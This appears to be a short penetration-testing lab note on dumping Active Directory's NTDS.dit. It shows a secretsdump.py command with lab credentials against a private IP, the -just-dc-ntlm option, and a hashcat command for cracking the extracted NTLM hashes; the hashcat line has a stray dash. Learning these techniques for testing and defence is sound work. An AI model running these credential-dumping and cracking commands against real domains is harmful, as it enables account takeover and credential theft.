# 🥟 Dumping the NTDS.dit

NTDS.dit is a database file used by Microsoft Active Directory (AD) to store information about objects in the directory, such as users, groups, and computers. NTDS stands for "NT Directory Service", and .dit is the file extension for the Directory Information Tree (DIT) database used by AD

<figure><img src="../../../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The NTDS.dit file contains a hierarchical structure of objects, attributes, and their relationships. It includes information about the object's security principals, such as their permissions, access control lists, and group memberships. The NTDS.dit file is used by the AD Domain Services (AD DS) to authenticate and authorize users and services, as well as to manage directory replication and other directory-related tasks.

```
secretsdump.py MARVEL.local/fcastle:'Password1'@192.168.138.136
```

<figure><img src="../../../.gitbook/assets/image (18) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And to dump out only the NTDS.DIT, you add  `-just-dc-ntlm`

<figure><img src="../../../.gitbook/assets/image (19) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

when cracking a hash in this context we're only interested in this part at the end

So there are plenty of ways to only grep out the hashes of the users, excel, sublime text, bash etc...

you can copy and paste all those hashes in a txt file and run hashcat on it:

```
hashcat -m 1000 -ntdsHash.txt /usr/share/wordlist/rockyou.txt
```

<figure><img src="../../../.gitbook/assets/image (20) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

You can add a `--show` so it only outputs the hashes and their clear text
